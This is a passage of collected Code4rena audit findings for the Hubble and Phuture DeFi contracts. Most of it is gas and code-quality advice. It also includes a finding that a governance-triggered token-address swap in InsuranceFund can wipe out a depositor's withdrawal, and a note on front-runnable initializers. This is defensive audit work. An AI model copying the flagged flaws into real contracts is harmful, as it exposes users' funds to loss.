division-by-0 prevention which is bypassed using shifting.  \n\nI suggest replacing `/ 2` with `>> 1` here:  \n\n```  \nClearingHouse.sol:212:            uint toInsurance = liquidationFee / 2;\n```  \n\n### Errors\n\n#### Reduce the size of error messages (Long revert Strings)\n\nShortening revert strings to fit in 32 bytes will decrease deployment time gas and will decrease runtime gas when the revert condition is met.\n\nRevert strings that are longer than 32 bytes require at least one additional mstore, along with additional overhead for computing memory offset, etc.\n\nRevert strings > 32 bytes are here:\n\n```\nAMM.sol:487:        require(baseAssetQuantity > 0, \"VAMM._long: baseAssetQuantity is <= 0\");\nAMM.sol:511:        require(baseAssetQuantity < 0, \"VAMM._short: baseAssetQuantity is >= 0\");\nClearingHouse.sol:84:            require(isAboveMinAllowableMargin(trader), \"CH: Below Minimum Allowable Margin\");\nClearingHouse.sol:101:        require(isAboveMinAllowableMargin(maker), \"CH: Below Minimum Allowable Margin\");\nMarginAccount.sol:174:        require(margin[VUSD_IDX][trader] >= 0, \"Cannot remove margin when vusd balance is negative\");\nMarginAccount.sol:354:        require(notionalPosition == 0, \"Liquidate positions before settling bad debt\");\nMarginAccount.sol:453:        require(repay <= maxRepay, \"Need to repay more to seize that much\"); \n```\n\nI suggest shortening the revert strings to fit in 32 bytes, or that using custom errors as described next.\n\n#### Use Custom Errors instead of Revert Strings to save Gas\n\nCustom errors from Solidity 0.8.4 are cheaper than revert strings (cheaper deployment cost and runtime cost when the revert condition is met)\n\nSource: <https://blog.soliditylang.org/2021/04/21/custom-errors/>:\n> Starting from [Solidity v0.8.4](https://github.com/ethereum/solidity/releases/tag/v0.8.4), there is a convenient and gas-efficient way to explain to users why an operation failed through the use of custom errors. Until now, you could already use strings to give more information about failures (e.g., `revert(\"Insufficient funds.\");`), but they are rather expensive, especially when it comes to deploy cost, and it is difficult to use dynamic information in them.\n\nCustom errors are defined using the `error` statement, which can be used inside and outside of contracts (including interfaces and libraries).\n\nInstances include:\n\n```\nlegos/Governable.sol:11:        require(msg.sender == governance, \"ONLY_GOVERNANCE\");\nAMM.sol:84:        require(msg.sender == clearingHouse, \"Only clearingHouse\");\nAMM.sol:89:        require(msg.sender == address(vamm), \"Only VAMM\");\nAMM.sol:119:        require(ammState == AMMState.Active, \"AMM.openPosition.not_active\");\nAMM.sol:186:        require(ammState != AMMState.Inactive, \"AMM.addLiquidity.amm_inactive\");\nAMM.sol:296:        require(abs(positionSize) >= abs(baseAssetQuantity), \"AMM.ONLY_REDUCE_POS\");\nAMM.sol:348:        require(_blockTimestamp() >= nextFundingTime, \"settle funding too early\");\nAMM.sol:487:        require(baseAssetQuantity > 0, \"VAMM._long: baseAssetQuantity is <= 0\");\nAMM.sol:511:        require(baseAssetQuantity < 0, \"VAMM._short: baseAssetQuantity is >= 0\");\nAMM.sol:723:        require(ammState != _state, \"AMM.setAmmState.sameState\");\nClearingHouse.sol:51:        require(_maintenanceMargin > 0, \"_maintenanceMargin < 0\");\nClearingHouse.sol:75:        require(baseAssetQuantity != 0, \"CH: baseAssetQuantity == 0\");\nClearingHouse.sol:84:            require(isAboveMinAllowableMargin(trader), \"CH: Below Minimum Allowable Margin\");\nClearingHouse.sol:101:        require(isAboveMinAllowableMargin(maker), \"CH: Below Minimum Allowable Margin\");\nClearingHouse.sol:120:        require(address(trader) != address(0), 'CH: 0x0 trader Address');\nClearingHouse.sol:154:        require(!isMaker(trader), 'CH: Remove Liquidity First');\nClearingHouse.sol:164:        require(\nClearingHouse.sol:189:        require(_calcMarginFraction(trader, false /* check funding payments again */) < maintenanceMargin, \"Above Maintenance Margin\");\nInsuranceFund.sol:30:        require(msg.sender == address(marginAccount), \"IF.only_margin_account\");\nInsuranceFund.sol:42:        require(pendingObligation == 0, \"IF.deposit.pending_obligations\");\nInsuranceFund.sol:64:        require(pendingObligation == 0, \"IF.withdraw.pending_obligations\");\nMarginAccount.sol:115:        require(_msgSender() == address(clearingHouse), \"Only clearingHouse\");\nMarginAccount.sol:150:        require(amount > 0, \"Add non-zero margin\");\nMarginAccount.sol:174:        require(margin[VUSD_IDX][trader] >= 0, \"Cannot remove margin when vusd balance is negative\");\nMarginAccount.sol:175:        require(margin[idx][trader] >= amount.toInt256(), \"Insufficient balance\");\nMarginAccount.sol:180:        require(clearingHouse.isAboveMinAllowableMargin(trader), \"MA.removeMargin.Below_MM\");\nMarginAccount.sol:354:        require(notionalPosition == 0, \"Liquidate positions before settling bad debt\");\nMarginAccount.sol:357:        require(getSpotCollateralValue(trader) < 0, \"Above bad debt threshold\");\nMarginAccount.sol:362:        require(vusdBal < 0, \"Nothing to repay\");\nMarginAccount.sol:438:        require(seized >= minSeizeAmount, \"Not seizing enough\");\nMarginAccount.sol:453:        require(repay <= maxRepay, \"Need to repay more to seize that much\");\nMarginAccount.sol:461:        require(idx > VUSD_IDX && idx < supportedCollateral.length, \"collateral not seizable\");\nMarginAccount.sol:549:        require(_weight <= PRECISION, \"weight > 1e6\");\nMarginAccount.sol:553:            require(address(_collaterals[i].token) != _coin, \"collateral exists\");\nMarginAccount.sol:601:        require(_liquidationIncentive <= PRECISION / 10, \"MA.syncDeps.LI_GT_10_percent\");\nMarginAccount.sol:603:        require(registry.marginAccount() == address(this), \"Incorrect setup\");\nMarginAccount.sol:617:        require(_weight <= PRECISION, \"weight > 1e6\");\nMarginAccount.sol:618:        require(idx < supportedCollateral.length, \"Collateral not supported\");\nMinimalForwarder.sol:15:        require(success, string(abi.encodePacked(\"META_EXEC_FAILED: \", returnData)));\nOracle.sol:48:        require(intervalInSeconds != 0, \"interval can't be 0\");\nOracle.sol:153:        require(_round > 0, \"Not enough history\");\nOracle.sol:157:        require(_addr != address(0), \"empty address\");\nVUSD.sol:33:        require(_reserveToken != address(0), \"vUSD: null _reserveToken\");\nVUSD.sol:55:        require(reserve >= withdrawals[start].amount, 'Cannot process withdrawals at this time: Not enough balance');\n```\n\nI suggest replacing revert strings with custom errors.\n",
    "dataSource": {
      "name": "code-423n4/2022-02-hubble-findings",
      "repo": "https://github.com/code-423n4/2022-02-hubble-findings",
      "url": "https://github.com/code-423n4/2022-02-hubble-findings/issues/135"
    }
  },
  {
    "title": "QA Report",
    "body": "* The error message should be <= 0 :\n```solidity\n  require(_maintenanceMargin > 0, \"_maintenanceMargin < 0\");\n```\n\n* There are functions that do not follow the Check-Effects-Interaction pattern, e.g. addMarginFor, processWithdrawals. They have external calls in the middle of execution, e.g. inside the loop, so should have extra protection from re-entrancy just in case, unless you 100% trust these external contracts (e.g. tokens), but nevertheless I think you should always act preventively.\n\n* VUSD returns hardcoded 6 decimals:\n```solidity\n    function decimals() public pure override returns (uint8) {\n        return 6;\n    }\n```\nWhile in practice it should be tied with USDC token that has 6 decimals:\n```solidity\n    /// @notice vUSD is backed 1:1 with reserveToken (USDC)\n    IERC20 public immutable reserveToken;\n```\nThere is no restriction of setting another reserveToken, so consider calling .decimals() when setting the reserveToken, and then assign the same value to the VUSD decimals.\n\n* There are TODOs left:\n```solidity\n  // @todo put checks on slippage\n  // sending market orders can fk the trader. @todo put some safe guards around price of liquidations\n  // @todo handle case when totalPosition = 0\n  @todo consider providing some incentive from insurance fund to execute a liquidation in this scenario.\n```\n\n\n* I think the condition should not be inclusive here:\n```solidity\n  while (i < withdrawals.length && (i - start) <= maxWithdrawalProcesses)\n```\ne.g. when maxWithdrawalProcesses = 3, it will actually execute the loop 4 times.\n\n* Consider introducing reasonable upper and lower limits for setMaxWithdrawalProcesses, otherwise an admin can grief by setting it to 0 and thus blocking the withdrawals, unless this may be intended.\n\n* Oracle always assumes that the result will have 8 decimals, thus it divides by a hardcoded value of 100.\nYou should verify that by calling .decimals on Chainlink oracle: https://docs.chain.link/docs/price-feeds-api-reference/#decimals\n\n",
    "dataSource": {
      "name": "code-423n4/2022-02-hubble-findings",
      "repo": "https://github.com/code-423n4/2022-02-hubble-findings",
      "url": "https://github.com/code-423n4/2022-02-hubble-findings/issues/105"
    }
  },
  {
    "title": "Gas Optimizations",
    "body": "**[S]**: Suggested optimation, save a decent amount of gas without compromising readability;\n\n**[M]**: Minor optimation, the amount of gas saved is minor, change when you see fit;\n\n**[N]**: Non-preferred, the amount of gas saved is at cost of readability, only apply when gas saving is a top priority.\n\n## [S] Duplicated `assert` statements\n\nhttps://github.com/code-423n4/2022-02-hubble/blob/ed1d885d5dbc2eae24e43c3ecbf291a0f5a52765/contracts/curve-v2/Swap.vy#L666-L671\n\n```vyper\n@external\n@nonreentrant('lock')\ndef add_liquidity(amounts: uint256[N_COINS], min_mint_amount: uint256) -> (uint256):\n    assert msg.sender == self.amm, 'VAMM: OnlyAMM'\n    assert not self.is_killed  # dev: the pool is killed\n    assert msg.sender == self.amm\n```\n\nL669 and L671 are duplicated.\n\n## [S] Outdated versions of OpenZeppelin library\n\nOutdated versions of OpenZeppelin library are used.\n\nIt's a best practice to use the latest version of libraries.\n\nNew versions of OpenZeppelin libraries can be more gas effeicant. \n\nFor exmaple:\n\n`ERC20Upgradeable.sol` in @openzeppelin/contracts-upgradeable@4.3.2:\n\nhttps://github.com/OpenZeppelin/openzeppelin-contracts-upgradeable/blob/v4.3.2/contracts/token/ERC20/ERC20Upgradeable.sol#L155-L169\n\n```solidity\n    function transferFrom(\n        address sender,\n        address recipient,\n        uint256 amount\n    ) public virtual override returns (bool) {\n        _transfer(sender, recipient, amount);\n\n        uint256 currentAllowance = _allowances[sender][_msgSender()];\n        require(currentAllowance >= amount, \"ERC20: transfer amount exceeds allowance\");\n        unchecked {\n            _approve(sender, _msgSender(), currentAllowance - amount);\n        }\n\n        return true;\n    }\n```\n\nA gas optimization upgrade has been added to @openzeppelin/contracts@4.5.0:\n\nhttps://github.com/OpenZeppelin/openzeppelin-contracts-upgradeable/blob/v4.5.0/contracts/token/ERC20/ERC20Upgradeable.sol#L163-L172\n```solidity\n    function transferFrom(\n        address from,\n        address to,\n        uint256 amount\n    ) public virtual override returns (bool) {\n        address spender = _msgSender();\n        _spendAllowance(from, spender, amount);\n        _transfer(from, to, amount);\n        return true;\n    }\n```\n\nhttps://github.com/OpenZeppelin/openzeppelin-contracts-upgradeable/blob/v4.5.0/contracts/token/ERC20/ERC20Upgradeable.sol#L335-L347\n\n```solidity\n    function _spendAllowance(\n        address owner,\n        address spender,\n        uint256 amount\n    ) internal virtual {\n        uint256 currentAllowance = allowance(owner, spender);\n        if (currentAllowance != type(uint256).max) {\n            require(currentAllowance >= amount, \"ERC20: insufficient allowance\");\n            unchecked {\n                _approve(owner, spender, currentAllowance - amount);\n            }\n        }\n    }\n```\n\n*   reduce allowance before triggering transfer. ([#3056](https://github.com/OpenZeppelin/openzeppelin-contracts/pull/3056))\n*   do not update allowance on `transferFrom` when allowance is `type(uint256).max`. ([#3085](https://github.com/OpenZeppelin/openzeppelin-contracts/pull/3085))\n*   cache _msgSender ([#3167](https://github.com/OpenZeppelin/openzeppelin-contracts/pull/3167#issuecomment-1030908890))\n\n\n## [S] Avoid unnecessary storage reads in for loops can save gas\n\nFor the storage variables that will be accessed multiple times, especially in loops, cache and read from the stack can save ~100 gas from each extra read (`SLOAD` after Berlin).\n\nFor example:\n\nhttps://github.com/code-423n4/2022-02-hubble/blob/ed1d885d5dbc2eae24e43c3ecbf291a0f5a52765/contracts/VUSD.sol#L53-L67\n\n```solidity=53\n    function processWithdrawals() external {\n        uint reserve = reserveToken.balanceOf(address(this));\n        require(reserve >= withdrawals[start].amount, 'Cannot process withdrawals at this time: Not enough balance');\n        uint i = start;\n        while (i < withdrawals.length && (i - start) <= maxWithdrawalProcesses) {\n            Withdrawal memory withdrawal = withdrawals[i];\n            if (reserve < withdrawal.amount) {\n                break;\n            }\n            reserveToken.safeTransfer(withdrawal.usr, withdrawal.amount);\n            reserve -= withdrawal.amount;\n            i += 1;\n        }\n        start = i;\n    }\n```\n\n`start` and `maxWithdrawalProcesses` can be cached.\n\n\n## [M] Adding unchecked directive can save gas\n\nFor the arithmetic operations that will never over/underflow, using the unchecked directive (Solidity v0.8 has default overflow/underflow checks) can save some gas from the unnecessary internal over/underflow checks.\n\nFor example:\n\n\nhttps://github.com/code-423n4/2022-02-hubble/blob/ed1d885d5dbc2eae24e43c3ecbf291a0f5a52765/contracts/MarginAccount.sol#L572-L579\n\n```solidity=572\n    function _transferInVusd(address from, uint amount) internal {\n        IERC20(address(vusd)).safeTransferFrom(from, address(this), amount);\n        if (credit > 0) {\n            uint toBurn = Math.min(vusd.balanceOf(address(this)), credit);\n            credit -= toBurn;\n            vusd.burn(toBurn);\n        }\n    }\n```\n\n`credit -= toBurn` will never overflow.\n\n\nhttps://github.com/code-423n4/2022-02-hubble/blob/ed1d885d5dbc2eae24e43c3ecbf291a0f5a52765/contracts/MarginAccount.sol#L581-L593\n\n```solidity=581\n    function _transferOutVusd(address recipient, uint amount) internal {\n        uint bal = vusd.balanceOf(address(this));\n        if (bal < amount) {\n            // Say there are 2 traders, Alice and Bob.\n            // Alice has a profitable position and realizes their PnL in form of vusd margin.\n            // But bob has not yet realized their -ve PnL.\n            // In that case we'll take a credit from vusd contract, which will eventually be returned when Bob pays their debt back.\n            uint _credit = amount - bal;\n            credit += _credit;\n            vusd.mint(address(this), _credit);\n        }\n        IERC20(address(vusd)).safeTransfer(recipient, amount);\n    }\n```\n\n`uint _credit = amount - bal` will never overflow.\n\n## [S] Using immutable variable can save gas\n \nhttps://github.com/code-423n4/2022-02-hubble/blob/ed1d885d5dbc2eae24e43c3ecbf291a0f5a52765/contracts/MarginAccountHelper.sol#L15-L26\n\n```solidity=15\n    IMarginAccount marginAccount;\n    VUSD vusd;\n    IERC20 public reserveToken;\n\n    constructor(address _marginAccount, address _vusd) {\n        marginAccount = IMarginAccount(_marginAccount);\n        vusd = VUSD(_vusd);\n        reserveToken = vusd.reserveToken();\n\n        reserveToken.safeApprove(address(_vusd), type(uint).max);\n        IERC20(_vusd).safeApprove(address(_marginAccount), type(uint).max);\n    }\n```\n\nConsidering that `marginAccount`, `vusd` and `reserveToken` will never change, changing them to immutable variables instead of storages variable can save gas.",
    "dataSource": {
      "name": "code-423n4/2022-02-hubble-findings",
      "repo": "https://github.com/code-423n4/2022-02-hubble-findings",
      "url": "https://github.com/code-423n4/2022-02-hubble-findings/issues/102"
    }
  },
  {
    "title": "[WP-H7] `InsuranceFund#syncDeps()` may cause users' fund loss",
    "severity": "medium",
    "body": "# Lines of code\n\nhttps://github.com/code-423n4/2022-02-hubble/blob/ed1d885d5dbc2eae24e43c3ecbf291a0f5a52765/contracts/InsuranceFund.sol#L116-L119\n\n\n# Vulnerability details\n\nhttps://github.com/code-423n4/2022-02-hubble/blob/ed1d885d5dbc2eae24e43c3ecbf291a0f5a52765/contracts/InsuranceFund.sol#L116-L119\n\n```solidity\nfunction syncDeps(IRegistry _registry) public onlyGovernance {\n    vusd = IERC20(_registry.vusd());\n    marginAccount = _registry.marginAccount();\n}\n```\n\nThe `Governance` address can call `InsuranceFund.sol#syncDeps()` to change the contract address of `vusd` anytime.\n\nHowever, since the tx to set a new address for `vusd` can get in between users' txs to deposit and withdraw, in some edge cases, it can result in users' loss of funds.\n\n### PoC\n\n1. Alice deposited `1,000,000 VUSD` to `InsuranceFund`;\n2. Gov called `syncDeps()` and set `vusd` to the address of `VUSDv2`;\n3. Alice called `withdraw()` with all the `shares` and get back `0 VUSDv2`.\n\nAs a result, Alice suffered a fund loss of `1,000,000 VUSD`.\n\n### Recommendation\n\n1. Consider making `vusd` unchangeable;\n2. If a possible migration of `vusd` must be considered, consider changing the `syncDeps()` to:\n\n```solidity\nfunction syncDeps(IRegistry _registry) public onlyGovernance {\n    uint _balance = balance();\n    vusd = IERC20(_registry.vusd());\n    require(balance() >= _balance);\n    marginAccount = _registry.marginAccount();\n}\n```\n\n",
    "dataSource": {
      "name": "code-423n4/2022-02-hubble-findings",
      "repo": "https://github.com/code-423n4/2022-02-hubble-findings",
      "url": "https://github.com/code-423n4/2022-02-hubble-findings/issues/100"
    }
  },
  {
    "title": "QA Report",
    "body": "# QA Report\n**Table of Contents:**\n- [QA Report](#qa-report)\n  - [Foreword](#foreword)\n  - [Summary](#summary)\n  - [File: AMM.sol](#file-ammsol)\n    - [Imports](#imports)\n      - [Useless `import { Ownable } from \"@openzeppelin/contracts/access/Ownable.sol\"`](#useless-import--ownable--from-openzeppelincontractsaccessownablesol)\n    - [function addLiquidity()](#function-addliquidity)\n      - [A Magical number should be explained: `1e30`](#a-magical-number-should-be-explained-1e30)\n    - [function lastPrice()](#function-lastprice)\n      - [A Magical number should be explained: `1e12`](#a-magical-number-should-be-explained-1e12)\n    - [function _updateFundingRate()](#function-_updatefundingrate)\n      - [A Magical number should be explained: `1e6`](#a-magical-number-should-be-explained-1e6)\n  - [File: ClearingHouse.sol](#file-clearinghousesol)\n    - [General](#general)\n      - [Unbounded iteration over all `amms`](#unbounded-iteration-over-all-amms)\n    - [function _liquidateTaker()](#function-_liquidatetaker)\n      - [Use same revert string on L189 as L166 for consistency: `\"CH: Above Maintenance Margin\"`](#use-same-revert-string-on-l189-as-l166-for-consistency-ch-above-maintenance-margin)\n  - [File: MarginAccount.sol](#file-marginaccountsol)\n    - [function weightedAndSpotCollateral()](#function-weightedandspotcollateral)\n      - [A Magical number should be explained: `6`](#a-magical-number-should-be-explained-6)\n  - [File: Oracle.sol](#file-oraclesol)\n    - [Imports](#imports-1)\n      - [Useless `import { Ownable } from \"@openzeppelin/contracts/access/Ownable.sol\"`](#useless-import--ownable--from-openzeppelincontractsaccessownablesol-1)\n  - [File: Registry.sol](#file-registrysol)\n    - [constructor](#constructor)\n      - [Missing address(0) checks](#missing-address0-checks)\n\n\n\n## Foreword\n- **`@audit` tags**\n> The code is annotated at multiple places with `//@audit` comments to pinpoint the issues. Please, pay attention to them for more details.\n\n## Summary\n- All `initialize()` or `ìnit()` functions are front-runnable in the whole solution. I suggest adding some access control to them:\n```\ncontracts/AMM.sol:\n  93:     function initialize(\n\ncontracts/ClearingHouse.sol:\n  35:     function initialize(\n\ncontracts/InsuranceFund.sol:\n  34:     function initialize(address _governance) external {\n\ncontracts/MarginAccount.sol:\n  121:     function initialize(\n\ncontracts/Oracle.sol:\n  20:     function initialize(address _governance) external initializer {\n\ncontracts/VUSD.sol:\n  38:         super.initialize(\"Hubble USD\", \"hUSD\"); // has initializer modifier\n```\n- There are 4 Open TODOs to not forget before deployment:\n```\ncontracts/AMM.sol:\n  142:         // sending market orders can fk the trader. @todo put some safe guards around price of liquidations\n  555:             // @todo handle case when totalPosition = 0\n\ncontracts/ClearingHouse.sol:\n  172:             // @todo put checks on slippage\n\ncontracts/MarginAccount.sol:\n  277:             @todo consider providing some incentive from insurance fund to execute a liquidation in this scenario.\n```\n- While `Ownable` is never used, it's imported twice.\n- Several places use magic numbers. I suggest either adding comments or storing the values in well-named constants for maintainability and readability.\n- All `@param` comments concerning `timestamp` are missing on the events in `MarginAccount.sol`\n- For the future of the solution and as a good practice, consider calculating the balance before and after a transfer:\n```\n*From:*\nFile: InsuranceFund.sol\n51:         vusd.safeTransferFrom(msg.sender, address(this), _amount);\n\n*To:*\n51:         uint256 balanceBefore = vusd.balanceOf(address(this));\n52:         vusd.safeTransferFrom(msg.sender, address(this), _amount);\n53:         uint256 receivedAmount = vusd.balanceOf(address(this)) - balanceBefore;\n```\n\n## File: AMM.sol\n### Imports\n#### Useless `import { Ownable } from \"@openzeppelin/contracts/access/Ownable.sol\"`\n`Ownable` capabilities are not used in this contract.\n\n### function addLiquidity()\n#### A Magical number should be explained: `1e30`\nPlease, either add a comment or store the value in a constant for maintainability and readability. Here, `1e30` isn't easily guessable:\n```\n190:             quoteAsset = baseAssetQuantity * vamm.price_scale() / 1e30; //@audit magical number should be explained\n```\n\n### function lastPrice()\n#### A Magical number should be explained: `1e12`\nPlease, either add a comment or store the value in a constant for maintainability and readability. Here, `1e12` isn't easily guessable:\n```\n470:         return vamm.last_prices() / 1e12; //@audit magical number should be explained\n```\n\n### function _updateFundingRate()\n#### A Magical number should be explained: `1e6`\nHere, we can guess that it's the number of decimals. However, hardcoding this value in the code is bad practice. Consider storing it in a constant.\n```\n710:         fundingRate = _premiumFraction * 1e6 / _underlyingPrice; //@audit magical number should be explained\n```\n\n## File: ClearingHouse.sol\n### General\n#### Unbounded iteration over all `amms`\n\nThere are many for-loops iterating over the dynamic array `IAMM[] amms`:\n```\nClearingHouse.sol:122:        for (uint i = 0; i < amms.length; i++) {\nClearingHouse.sol:130:        for (uint i = 0; i < amms.length; i++) {\nClearingHouse.sol:170:        for (uint i = 0; i < amms.length; i++) {\nClearingHouse.sol:194:        for (uint i = 0; i < amms.length; i++) { // liquidate all positions\nClearingHouse.sol:251:        for (uint i = 0; i < amms.length; i++) {\nClearingHouse.sol:263:        for (uint i = 0; i < amms.length; i++) {\nClearingHouse.sol:277:        for (uint i = 0; i < amms.length; i++) {\n```\n\nI suggest being very careful as the execution may exceed the block gas limit, consume all the gas provided, and fail. \nA removal function is missing here.\nYou can consider introducing max limits on items in the arrays or make sure that elements can be removed from dynamic arrays in case it becomes too large.\n\n### function _liquidateTaker()\n#### Use same revert string on L189 as L166 for consistency: `\"CH: Above Maintenance Margin\"`\nI suggest using the same string on L189 as L166 for consistency:\n```\n166:             \"CH: Above Maintenance Margin\"\n...\n189:         require(_calcMarginFraction(trader, false /* check funding payments again */) < maintenanceMargin, \"Above Maintenance Margin\");\n```\n\n## File: MarginAccount.sol\n### function weightedAndSpotCollateral()\n#### A Magical number should be explained: `6`\nHere, we can guess that it's the number of decimals. However, hardcoding this value in the code is bad practice. Consider storing it in a constant.\n```\nFile: MarginAccount.sol\n528:             weighted += (numerator * _collateral.weight.toInt256() / int(10 ** (denomDecimals + 6)));\n```\n\n## File: Oracle.sol\n### Imports\n#### Useless `import { Ownable } from \"@openzeppelin/contracts/access/Ownable.sol\"`\n`Ownable` capabilities are not used in this contract.\n\n## File: Registry.sol\n### constructor\n#### Missing address(0) checks\nImmutable addresses should be checked for address(0) to avoid needed to redeploy the contract. \nIt's done here:\n```\nFile: VUSD.sol\n32:     constructor(address _reserveToken) {\n33:         require(_reserveToken != address(0), \"vUSD: null _reserveToken\");\n34:         reserveToken = IERC20(_reserveToken);\n35:     }\n```\nTherefore, I suggest doing the same for the addresses in Registry.sol:\n```\n12:     constructor(\n13:         address _oracle,\n14:         address _clearingHouse,\n15:         address _insuranceFund,\n16:         address _marginAccount,\n17:         address _vusd\n18:     ) {\n19: \n20:         oracle = _oracle; //@audit missing address(0) check\n21:         clearingHouse = _clearingHouse; //@audit missing address(0) check\n22:         insuranceFund = _insuranceFund; //@audit missing address(0) check\n23:         marginAccount = _marginAccount; //@audit missing address(0) check\n24:         vusd = _vusd; //@audit missing address(0) check\n25:     }\n```",
    "dataSource": {
      "name": "code-423n4/2022-02-hubble-findings",
      "repo": "https://github.com/code-423n4/2022-02-hubble-findings",
      "url": "https://github.com/code-423n4/2022-02-hubble-findings/issues/94"
    }
  },
  {
    "title": "QA Report",
    "body": "# QA Report\n\n## Remarks/Recommendations\n\n- A test suite would have been very useful. A comprehensive test suite has two major benefits:\n  * it serves as documentation for how the system is used in practice. It has the added benefit of being more _precise_ than describing the system in English.\n  * it can be extended by auditors to write Proofs of Concept of exploits. I like to do this myself and then provide links to my GitHub to help the sponsors. Here is an [example](https://github.com/sseefried/codearena-paladin-2022-03/blob/3456ce6013f4bd7f5660d90807ea48d771520033/test/noValidationOfConstructorParametersBugs.ts) of a small bug I found during the Paladin contest.\n\n- In general, it was quite hard to work out how all these contracts were used together in practice. Tests would have aided my understanding. Failing that, a worked example of just which functions were called in each contract would have been useful. The documentation provided [here](https://docs.google.com/document/d/1Y_c9K3x0FNGZ14iB4kIMC4o5sSyWNc1eeR_ghUTlukE) was imprecise. A more precise example of what would have been useful appears below. (Be aware, I don't know if this is correct. It's just an example to give a flavour of the level of precision that would be useful)\n\n   1. User deposits ERC20 tokens to the address of an instance of the `IndexLogic` contract.\n   2. User calls `mint` function passing their address as `_recipient` parameter.\n   3. ... etc ...\n\n## Low Risk: Weights can be calculated in such a way as to not add up to 255\n\n### Impact\n\nA weight between 0 and 255 is too low precision in order to guarantee that the weights in an index always add up to 255. This can lead to incorrect calculations of the value/price of the index.\n\n### Proof of Concept\n\nConsider the following scenario:\n- token A capitalization = 1\n- token B capitalization = 9999\n\nThen we would get weights:\n\n- `(1 * 255) / 10000 = 0`\n- `(9999 * 255) / 1000 = 254`\n\nThese do not add up to 255\n\n### Tools used\n\nManual inspection\n\n### Recommended Mitigation Steps\n\nUse a value larger than `uint8` to represent weights. There is little reason to restrict oneself to a small integer. Also, consider using a fractional value instead.\n",
    "dataSource": {
      "name": "code-423n4/2022-04-phuture-findings",
      "repo": "https://github.com/code-423n4/2022-04-phuture-findings",
      "url": "https://github.com/code-423n4/2022-04-phuture-findings/issues/94"
    }
  },
  {
    "title": "QA Report",
    "body": "## Low\n### 1. Unsafe ERC20 Operations\n#### Proof of Concept\n```shell\n  phuture/IndexLogic.sol::139 => vToken.transfer(address(vToken), accountBalance);\n  phuture/vToken.sol::210 => _NAV.transfer(_from, _to, _amount);\n```\n#### Recommendation\nUse openzeppelin's `safeTransfer()` function.\n#### Tools used\nc4udit.",
    "dataSource": {
      "name": "code-423n4/2022-04-phuture-findings",
      "repo": "https://github.com/code-423n4/2022-04-phuture-findings",
      "url": "https://github.com/code-423n4/2022-04-phuture-findings/issues/86"
    }
  },
  {
    "title": "QA Report",
    "body": "### **Inconsistent usage of uint256 and uint**\n\n**Summary**: FullMath.sol, FixedPoint112.sol and [vToken.sol](https://github.com/code-423n4/2022-04-phuture/blob/47cd226c80842585542599a3b56cc2a26b519d8a/contracts/vToken.sol) (L222) uses `uint256` while all other contracts use `uint`.\n\n**Details**: To favor explicitness and readability, consider replacing all instances of `uint` to `uint256`.\n\n**Mitigation**: Change `uint` to `uint256` in all contracts.\n\n**Impact**: Informational/Low risk\n\n### **Inconsistent solidity pragma**\n\n**Summary**: FullMath.sol has different solidity compiler ranges referenced than the other contracts. \n\n**Details**: FullMath.sol uses `pragma solidity >=0.8.4 <0.9.0;` while the other contracts in scope uses `pragma solidity >=0.8.7;`. This range difference leads to potential security flaws between deployed contracts depending on the compiler version chosen for any particular file. It also greatly increases the cost of maintenance as different compiler versions have different semantics and behavior.\n\n**Mitigation**: Use the same compiler range for all contracts. \n\n**Impact**: Informational/Low risk\n\n### Contracts s**hould use the Upgradeable variant of OpenZeppelin Contracts**\n\n**Summary**: vToken.sol imports the [non-upgradeable version of SafeERC20](https://github.com/code-423n4/2022-04-phuture/blob/594459d0865fb6603ba388b53f3f01648f5bb6fb/contracts/vToken.sol#L7). \n\n**Details**: If your contract is going to be deployed with upgradeability, such as using the [OpenZeppelin Upgrades Plugins](https://docs.openzeppelin.com/upgrades-plugins/1.x/), it is recommended to use the Upgrade Safe variant of OpenZeppelin Contracts.\n\nIn particular, the contract use the non-upgradeable versions of SafeERC20.sol, IAccessControl.sol and Math.sol.\n\n**Mitigation**: Use the upgradeable version of SafeERC20.sol, IAccessControl.sol and Math.sol.\n\n**Impact**: Informational/Low risk\n\n### Misleading calculation of gap size\n\n**Summary**: Length of `__gap` array is non-default in vToken.sol\n\n**Details:** OpenZeppelin upgradeable contracts includes a state variable named `__gap`. This is an empty reserved space in storage that is put in place to allow to freely add new state variables in the future without compromising the storage compatibility with existing deployments. The size of the `__gap` array is calculated so that the amount of storage used by a contract always adds up to the same number (per default, 50 storage slots, unless a directive `@custom:storage-size X` is used with `X` being the number of storage slots).\n\nIt is important to note that `constants` variables does not count for gap calculation in OpenZeppelin upgradeable contracts (see e.g. [ReentrancyGuardUpgradeable.sol](https://github.com/OpenZeppelin/openzeppelin-contracts-upgradeable/blob/cf68a02973de4a8745dc457a82d48ce238419980/contracts/security/ReentrancyGuardUpgradeable.sol#L72)), so the `__gap` array uses a non-default length for the `__gap` array and this is not explicitly noted in the code.\n\n**Mitigation**: To maintain compatibility with OpenZeppelin library, use `uint256[45] private __gap;` instead of `uint256[42] private __gap;`.\n\n**Impact**: Informational/Low risk",
    "dataSource": {
      "name": "code-423n4/2022-04-phuture-findings",
      "repo": "https://github.com/code-423n4/2022-04-phuture-findings",
      "url": "https://github.com/code-423n4/2022-04-phuture-findings/issues/82"
    }
  },
  {
    "title": "Gas Optimizations",
    "body": "1. Using multiple `require()` instead of `&&` can save gas\n\nProof of Concept:\nhttps://github.com/code-423n4/2022-04-phuture/blob/main/contracts/ChainlinkPriceOracle.sol#L86\n\nRecommended Mitigation Steps:\nChange to:\n```\n\trequire(basePrice > 0, \"ChainlinkPriceOracle: NEGATIVE\");\n\trequire(quotePrice > 0, \"ChainlinkPriceOracle: NEGATIVE\");\n```\n\n========================================================================\n\n2. Caching `.length()` for loop can save gas\n\nProof of Concept:\nhttps://github.com/code-423n4/2022-04-phuture/blob/main/contracts/IndexLogic.sol#L39\nhttps://github.com/code-423n4/2022-04-phuture/blob/main/contracts/IndexLogic.sol#L60\nhttps://github.com/code-423n4/2022-04-phuture/blob/main/contracts/ManagedIndexReweightingLogic.sol#L38\nhttps://github.com/code-423n4/2022-04-phuture/blob/main/contracts/ManagedIndexReweightingLogic.sol#L50\n\nRecommended Mitigation Steps:\nChange to:\n```\n\tuint length = assets.length();\n\tfor (uint i; i < length ; ++i) {\n```\n\n========================================================================\n\n3. Using `!=` instead of `>` is more gas efficient\n\nProof of Concept:\nhttps://github.com/code-423n4/2022-04-phuture/blob/main/contracts/IndexLogic.sol#L76\nhttps://github.com/code-423n4/2022-04-phuture/blob/main/contracts/IndexLogic.sol#L86\nhttps://github.com/code-423n4/2022-04-phuture/blob/main/contracts/IndexLogic.sol#L98\n\nRecommended Mitigation Steps:\nChange 